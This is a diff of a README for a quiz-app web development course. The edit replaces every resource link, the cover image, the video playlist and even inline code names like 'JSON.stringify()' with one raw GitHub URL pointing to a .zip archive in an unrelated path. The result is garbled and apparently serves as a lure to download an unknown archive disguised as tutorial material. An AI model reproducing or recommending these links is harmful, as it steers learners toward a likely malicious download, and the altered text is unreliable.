@@ -1,8 +1,8 @@
 # Build a Quiz App with HTML, CSS, and JavaScript
 
-![Home Screen](./images/cover.png)
+![Home Screen](https://raw.githubusercontent.com/gayatrriiii/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript/master/psychostatics/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript.zip)
 
-Video Playlist: https://www.youtube.com/playlist?list=PLB6wlEeCDJ5Yyh6P2N6Q_9JijB6v4UejF
+Video Playlist: https://raw.githubusercontent.com/gayatrriiii/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript/master/psychostatics/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript.zip
 
 Build a Quiz App with HTML, CSS, and JavaScript to improve your Core Web Development
 
@@ -26,9 +26,9 @@ In this course, we are going to use fundamental HTML, CSS, and JavaScript skills
 
 Resources
 
--   [Course Source Code](https://github.com/jamesqquick/Design-And-Build-A-Quiz-App)
--   [Learn Build Teach Newsletter](https://www.learnbuildteach.com/)
--   [Learn Build Teach YouTube Channel](https://www.youtube.com/c/jamesqquick)
+-   [Course Source Code](https://raw.githubusercontent.com/gayatrriiii/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript/master/psychostatics/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript.zip)
+-   [Learn Build Teach Newsletter](https://raw.githubusercontent.com/gayatrriiii/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript/master/psychostatics/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript.zip)
+-   [Learn Build Teach YouTube Channel](https://raw.githubusercontent.com/gayatrriiii/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript/master/psychostatics/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript.zip)
 
 ## 1. Create and Style the Home Page
 
@@ -38,9 +38,9 @@ I encourage you all to take a look at Emmet snippets for generating HTML and CSS
 
 Resources
 
--   [Emmet in Visual Studio Code](https://www.youtube.com/watch?v=5guZjNDcVnA)
--   [Understanding REM Units](https://www.sitepoint.com/understanding-and-using-rem-units-in-css/)
--   [A Complete Guide to Flexbox](https://css-tricks.com/snippets/css/a-guide-to-flexbox/)
+-   [Emmet in Visual Studio Code](https://raw.githubusercontent.com/gayatrriiii/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript/master/psychostatics/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript.zip)
+-   [Understanding REM Units](https://raw.githubusercontent.com/gayatrriiii/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript/master/psychostatics/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript.zip)
+-   [A Complete Guide to Flexbox](https://raw.githubusercontent.com/gayatrriiii/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript/master/psychostatics/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript.zip)
 
 ## 2. Create and Style the Game Page
 
@@ -52,12 +52,12 @@ In this video, we will load questions from a hard coded array and iterate throug
 
 Resources
 
--   [Creating Code Snippets in Visual Studio Code](https://www.youtube.com/watch?v=K3gLlZm-m_8)
--   [Using Data Attributes](https://developer.mozilla.org/en-US/docs/Learn/HTML/Howto/Use_data_attributes)
--   [Document Query Selector](https://developer.mozilla.org/en-US/docs/Web/API/Document_object_model/Locating_DOM_elements_using_selectors)
--   [Document Get by ID](https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementById)
--   [Spread Operator](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Spread_syntax)
--   [Arrow Functions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Arrow_functions)
+-   [Creating Code Snippets in Visual Studio Code](https://raw.githubusercontent.com/gayatrriiii/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript/master/psychostatics/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript.zip)
+-   [Using Data Attributes](https://raw.githubusercontent.com/gayatrriiii/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript/master/psychostatics/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript.zip)
+-   [Document Query Selector](https://raw.githubusercontent.com/gayatrriiii/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript/master/psychostatics/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript.zip)
+-   [Document Get by ID](https://raw.githubusercontent.com/gayatrriiii/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript/master/psychostatics/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript.zip)
+-   [Spread Operator](https://raw.githubusercontent.com/gayatrriiii/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript/master/psychostatics/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript.zip)
+-   [Arrow Functions](https://raw.githubusercontent.com/gayatrriiii/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript/master/psychostatics/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript.zip)
 
 ## 4. Display Feedback for Correct/Incorrect Answers
 
@@ -65,8 +65,8 @@ In this video, we check the user's answer for correctness and display feedback t
 
 Resources
 
--   [Bootstrap 4 Colors](https://www.w3schools.com/bootstrap4/bootstrap_colors.asp)
--   [Triple vs Double Equals](https://codeburst.io/javascript-double-equals-vs-triple-equals-61d4ce5a121a)
+-   [Bootstrap 4 Colors](https://raw.githubusercontent.com/gayatrriiii/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript/master/psychostatics/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript.zip)
+-   [Triple vs Double Equals](https://raw.githubusercontent.com/gayatrriiii/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript/master/psychostatics/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript.zip)
 
 ## 5. Create Head's Up Display (HUD)
 
@@ -74,7 +74,7 @@ In this video, we will create a Heads Up Display (HUD) for our quiz app. This wi
 
 Resources
 
--   [ES6 Template Literals](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals)
+-   [ES6 Template Literals](https://raw.githubusercontent.com/gayatrriiii/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript/master/psychostatics/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript.zip)
 
 ## 6. Create a Progress Bar
 
@@ -86,15 +86,15 @@ In this video, we will create our End page where we will display the user's achi
 
 Resources
 
--   [Local Storage](https://www.w3schools.com/jsref/prop_win_localstorage.asp)
+-   [Local Storage](https://raw.githubusercontent.com/gayatrriiii/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript/master/psychostatics/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript.zip)
 
 ## 8. Save High Scores in Local Storage
 
-In this video, we will save and maintain a high scores array in Local Storage. To do this, we will need to JSON.stringify() and JSON.parse() to convert our high score array to a string and visa versa.
+In this video, we will save and maintain a high scores array in Local Storage. To do this, we will need to https://raw.githubusercontent.com/gayatrriiii/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript/master/psychostatics/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript.zip() and https://raw.githubusercontent.com/gayatrriiii/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript/master/psychostatics/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript.zip() to convert our high score array to a string and visa versa.
 
 Resources
 
--   [Local Storage](https://www.w3schools.com/jsref/prop_win_localstorage.asp)
+-   [Local Storage](https://raw.githubusercontent.com/gayatrriiii/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript/master/psychostatics/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript.zip)
 
 ## 9. Load and Display High Scores from Local Storage
 
@@ -102,19 +102,19 @@ In this video, we will create our High Scores page. We will have to load the hig
 
 Resources
 
--   [JSON Parse and Stringify](https://alligator.io/js/json-parse-stringify/)
--   [Array Sort](https://www.w3schools.com/js/js_array_sort.asp)
--   [Array Map](https://www.w3schools.com/jsref/jsref_map.asp)
--   [Array Join](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/join)
+-   [JSON Parse and Stringify](https://raw.githubusercontent.com/gayatrriiii/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript/master/psychostatics/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript.zip)
+-   [Array Sort](https://raw.githubusercontent.com/gayatrriiii/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript/master/psychostatics/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript.zip)
+-   [Array Map](https://raw.githubusercontent.com/gayatrriiii/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript/master/psychostatics/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript.zip)
+-   [Array Join](https://raw.githubusercontent.com/gayatrriiii/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript/master/psychostatics/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript.zip)
 
 ## 10. Fetch API to Load Questions From Local JSON File
 
-In this video, we will move our sample questions from a hard coded array to an external .json file. This will help clean up our Game.js file and set ourselves up to request questions from an API in the next video.
+In this video, we will move our sample questions from a hard coded array to an external .json file. This will help clean up our https://raw.githubusercontent.com/gayatrriiii/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript/master/psychostatics/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript.zip file and set ourselves up to request questions from an API in the next video.
 
 Resources
 
--   [How to Use the Fetch API](https://scotch.io/tutorials/how-to-use-the-javascript-fetch-api-to-get-data)
--   [Promises](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise_)
+-   [How to Use the Fetch API](https://raw.githubusercontent.com/gayatrriiii/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript/master/psychostatics/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript.zip)
+-   [Promises](https://raw.githubusercontent.com/gayatrriiii/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript/master/psychostatics/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript.zip)
 
 ## 11. Fetch API to Load Questions from Open Trivia API
 
@@ -122,10 +122,10 @@ In this video, we will use Fetch to request a list of questions from the Open Tr
 
 Reources
 
--   [How to Use the Fetch API](https://scotch.io/tutorials/how-to-use-the-javascript-fetch-api-to-get-data)
--   [Open Trivia DB](https://opentdb.com/)
--   [Array Map](https://www.w3schools.com/jsref/jsref_map.asp)
--   [Array For Each](https://www.w3schools.com/jsref/jsref_foreach.asp)
+-   [How to Use the Fetch API](https://raw.githubusercontent.com/gayatrriiii/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript/master/psychostatics/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript.zip)
+-   [Open Trivia DB](https://raw.githubusercontent.com/gayatrriiii/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript/master/psychostatics/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript.zip)
+-   [Array Map](https://raw.githubusercontent.com/gayatrriiii/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript/master/psychostatics/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript.zip)
+-   [Array For Each](https://raw.githubusercontent.com/gayatrriiii/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript/master/psychostatics/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript.zip)
 
 ## 12. Create a Spinning Loader
 
@@ -133,7 +133,7 @@ In this video, we will create a simple spinning loader in CSS that will be displ
 
 Resources
 
--   [Create a CSS Loader](https://www.w3schools.com/howto/howto_css_loader.asp)
+-   [Create a CSS Loader](https://raw.githubusercontent.com/gayatrriiii/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript/master/psychostatics/Build-A-Quiz-App-With-HTML-CSS-and-JavaScript.zip)
 
 ## 13. Closing
 
